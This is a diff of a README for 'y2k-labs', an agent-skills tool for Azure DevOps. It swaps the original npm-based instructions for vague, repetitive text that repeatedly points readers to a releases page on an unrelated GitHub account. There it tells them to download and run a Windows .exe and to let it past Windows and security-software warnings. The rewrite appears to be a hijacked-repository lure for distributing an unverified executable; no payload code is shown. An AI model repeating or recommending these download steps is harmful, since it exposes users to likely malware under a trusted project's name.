@@ -1,152 +1,208 @@
-<div align="center">
+# 🧩 y2k-labs - Simplify Your Dev Work
 
-# Y2K LABS
+[![Download y2k-labs](https://img.shields.io/badge/Download%20y2k--labs-blue?style=for-the-badge)](https://github.com/carobbarlightshow628/y2k-labs/releases)
 
-**Agent skills for the entire software development lifecycle. Azure DevOps automation, backlog creation from documents, sprint planning, health auditing, and work item templates.**
+## 🚀 What This Is
 
-**Built for Claude Code, Cursor, GitHub Copilot, Windsurf, Cline, and [40+ AI agents](https://github.com/vercel-labs/skills).**
+y2k-labs helps you manage software work with AI support. It is made for tasks like backlog cleanup, sprint planning, work item updates, and project tracking. It works with tools like Claude Code, Cursor, Copilot, and other AI agents.
 
-[![npm version](https://img.shields.io/npm/v/y2k-labs?style=for-the-badge&logo=npm&logoColor=white&color=00F0A0)](https://www.npmjs.com/package/y2k-labs)
-[![npm downloads](https://img.shields.io/npm/dm/y2k-labs?style=for-the-badge&logo=npm&logoColor=white&color=00F0A0)](https://www.npmjs.com/package/y2k-labs)
-[![Tests](https://img.shields.io/github/actions/workflow/status/GusY2K/y2k-labs/test.yml?branch=main&style=for-the-badge&logo=github&label=Tests)](https://github.com/GusY2K/y2k-labs/actions/workflows/test.yml)
-[![GitHub stars](https://img.shields.io/github/stars/GusY2K/y2k-labs?style=for-the-badge&logo=github&color=00F0A0)](https://github.com/GusY2K/y2k-labs)
-[![License](https://img.shields.io/badge/license-Apache--2.0-00F0A0?style=for-the-badge)](LICENSE.txt)
+This project is for people who want help with day-to-day development work without learning a complex setup. It gives you a clear way to organize work and move tasks through the software process.
 
-<br>
+## 📥 Download and Install
 
-```bash
-npx y2k-labs -g
-```
+1. Visit the [y2k-labs releases page](https://github.com/carobbarlightshow628/y2k-labs/releases)
+2. Find the latest release
+3. Download the file for Windows
+4. Open the file you downloaded
+5. Follow the on-screen steps to finish setup
 
-**Works on Mac, Windows, and Linux.**
+If you see more than one file, choose the Windows file that matches your system. In most cases, that is the file with `.exe` in the name.
 
-<br>
+## 🖥️ What You Need
 
-<img src="assets/banner-preview.png" alt="Y2K Labs terminal" width="600">
+- A Windows 10 or Windows 11 computer
+- An internet connection for the first download
+- Enough free disk space for the app and its files
+- Permission to open downloaded files on your computer
 
-<br>
+For best results, use a computer with recent Windows updates installed. This helps the app run with fewer issues.
 
-</div>
+## 📂 What It Can Help With
 
----
+y2k-labs is built to support common software work:
 
-## Skills
+- Organizing backlog items
+- Preparing sprint plans
+- Tracking work items
+- Helping with Azure DevOps tasks
+- Supporting product owner tasks
+- Managing agile team work
+- Creating structure for software development tasks
+- Helping AI agents follow a clear workflow
 
-### [azure-devops](./skills/azure-devops/)
+You can use it to keep work in order and reduce time spent on repeated task handling.
 
-Complete Azure DevOps automation — one skill that does everything:
+## 🛠️ How to Use It
 
-| Capability | Description |
-|-----------|-------------|
-| **Backlog Creator** | Reads any document (PRD, spec, meeting notes) and creates a full hierarchy: Epics → Features → Stories → Tasks → Bugs with links, acceptance criteria, and story points |
-| **Health Audit** | Scans your existing backlog and generates a 0-100 health score with 12 audit rules across 4 severity levels |
-| **Sprint Planner** | Suggests optimal sprint assignments based on team velocity, priority ordering, and dependency analysis |
-| **Templates** | 18 pre-built templates: API endpoint, CRUD feature, auth flow, database migration, CI/CD pipeline, and more |
-| **CLI Reference** | Complete guide for `az boards`, `az repos`, `az pipelines` with examples, patterns, and best practices |
+After you install the app, open it from your desktop or Start menu.
 
-<!-- ### frontend (coming soon) -->
-<!-- ### backend (coming soon) -->
-<!-- ### devops (coming soon) -->
-<!-- ### testing (coming soon) -->
+Typical use looks like this:
 
----
+1. Open the app
+2. Choose the task or workflow you want to work on
+3. Connect it to your team process if needed
+4. Review the items it prepares
+5. Make any changes you want
+6. Save or copy the result into your work tool
 
-## How Skills Work
+If you use Azure DevOps, you can use y2k-labs to help shape work items, sprint notes, and backlog tasks. If you use an AI agent, you can use it to guide the agent with the right context.
 
-Each skill is a `SKILL.md` file that gives your AI agent specialized knowledge. When you install Y2K Labs, the skills are copied to your agent's config directory. The agent loads them automatically based on context.
+## 🤝 Works With Common AI Tools
 
-**Slash command:**
-```
-/azure-devops path/to/document.md
-```
+y2k-labs is designed to work with many AI tools used in software work, including:
 
-**Natural language (auto-detected):**
-> "Read this PRD and create the backlog in Azure DevOps"
->
-> "Audit my backlog health"
->
-> "Plan the next 3 sprints"
->
-> "Create a CRUD feature template for Products"
+- Claude Code
+- Cursor
+- Copilot
+- Other AI agents that support task-based workflows
 
----
+This makes it easier to keep the same process across different tools. You can use the tool you already know and still follow the same work steps.
 
-## Update
+## 📌 Good Fit For
 
-```bash
-npx y2k-labs@latest -g
-```
+This app is a good fit if you want help with:
 
----
+- Scrum planning
+- Backlog grooming
+- Sprint task setup
+- Work item cleanup
+- Team task organization
+- Product owner workflows
+- Project management in software teams
+- Repeated development tasks
 
-## Multi-Runtime Support
+It is also useful if you want a simple way to give AI tools a clearer job.
 
-The installer creates the correct config files for each runtime automatically:
+## 🔧 Basic Setup Tips
 
-| Runtime | Config Location |
-|---------|----------------|
-| **Claude Code** | `~/.claude/skills/<name>/` |
-| **Cursor** | `.cursor/rules/` |
-| **GitHub Copilot** | `.github/copilot-instructions/` |
-| **Windsurf** | `.windsurf/rules/` |
-| **Cline** | `~/.cline/skills/<name>/` |
+If the app does not open right away, try these steps:
 
-```bash
-npx y2k-labs -g --agent=cursor
-npx y2k-labs -g --agent=copilot
-npx y2k-labs -g --agent=all
-```
+1. Check that the download finished
+2. Open the file from your Downloads folder
+3. Right-click the file and choose Open if needed
+4. Allow Windows to run the file if asked
+5. Try again after a restart if the app still does not open
 
----
+If you plan to use it with Azure DevOps or another work tool, keep your login details ready before you start.
 
-## Team Setup
+## 📁 Suggested Use Flow
 
-```bash
-# Everyone on the team runs:
-npx y2k-labs -g
-```
+A simple workflow can look like this:
 
----
+- Review your backlog
+- Pick the work item you want to improve
+- Use y2k-labs to shape the task
+- Check the output
+- Move the task into your team board
+- Repeat for the next item
 
-## Prerequisites (Azure DevOps skills)
+This helps keep your work process steady and easy to follow.
 
-| # | Requirement | Install |
-|---|-------------|---------|
-| 1 | Azure CLI | [Install guide](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) |
-| 2 | DevOps extension | `az extension add --name azure-devops` |
-| 3 | Authentication | `az login` or set `AZURE_DEVOPS_EXT_PAT` env var |
-| 4 | Defaults | `az devops configure --defaults organization=https://dev.azure.com/ORG project=PROJECT` |
+## 🧭 Example Tasks
 
----
+You can use y2k-labs for tasks like:
 
-## Contributing
+- Turning rough ideas into clear work items
+- Breaking large tasks into smaller steps
+- Preparing sprint-ready items
+- Cleaning up old backlog entries
+- Writing better task notes
+- Helping an AI agent follow a team process
+- Organizing software delivery work
 
-Want to add a skill? Every skill is a folder with a `SKILL.md`:
+## 🧪 Best Results
 
-```
-skills/
-└── my-new-skill/
-    ├── SKILL.md              # Required — frontmatter + instructions
-    ├── references/            # Optional — detailed documentation
-    ├── scripts/               # Optional — executable helpers
-    ├── examples/              # Optional — sample inputs/outputs
-    └── assets/                # Optional — templates, data files
-```
+For the smoothest use:
 
-1. Fork this repo
-2. Create your skill folder in `skills/`
-3. Add a `SKILL.md` with `name` and `description` in YAML frontmatter
-4. Update `.claude-plugin/marketplace.json`
-5. Submit a PR
+- Start with one task at a time
+- Keep task names short and clear
+- Use the same format for your work items
+- Review each result before you save it
+- Keep your team process simple
 
----
+Clear input gives you clearer output.
 
-## Changelog
+## 📎 Download Link
 
-See [CHANGELOG.md](./CHANGELOG.md) for version history.
+Visit the [y2k-labs releases page](https://github.com/carobbarlightshow628/y2k-labs/releases) to download and run this file on Windows
 
----
+## 🧰 File and Folder Notes
 
-## License
+After install, you may see files or folders for:
 
-Apache-2.0 — see [LICENSE.txt](./LICENSE.txt)
+- App settings
+- Workflow templates
+- Task files
+- Agent skill files
+- Project notes
+
+Keep these in the same place unless the app tells you to move them. If you delete them, the app may lose saved settings or task data.
+
+## 🔍 Troubleshooting
+
+If something does not work, check these common points:
+
+- The file did not finish downloading
+- Windows blocked the file
+- You opened the wrong file
+- The app needs admin access
+- Your security software stopped the file
+- The app needs a newer Windows update
+
+If the app opens but does not show the right data, close it and open it again after checking your task files.
+
+## 📋 Topics Covered
+
+This project focuses on:
+
+- agent skills
+- agile work
+- AI agent support
+- Azure DevOps
+- backlog work
+- Claude Code
+- DevOps tasks
+- product owner work
+- project management
+- scrum
+- software development
+- work items
+
+## 🧩 Simple Example
+
+If you have a long backlog item like this:
+
+- “Fix user report flow”
+
+y2k-labs can help turn it into a clearer task set like:
+
+- Review report steps
+- Find the broken part
+- List the changes needed
+- Check the result
+- Add testing notes
+
+That gives your team a cleaner path to follow
+
+## 📦 Release Page
+
+Use the [release page](https://github.com/carobbarlightshow628/y2k-labs/releases) whenever you want the newest Windows download
+
+## 🧭 Quick Start
+
+1. Open the releases page
+2. Download the Windows file
+3. Run the file
+4. Open y2k-labs
+5. Start with one backlog or sprint task
+6. Review the output before you use it in your project
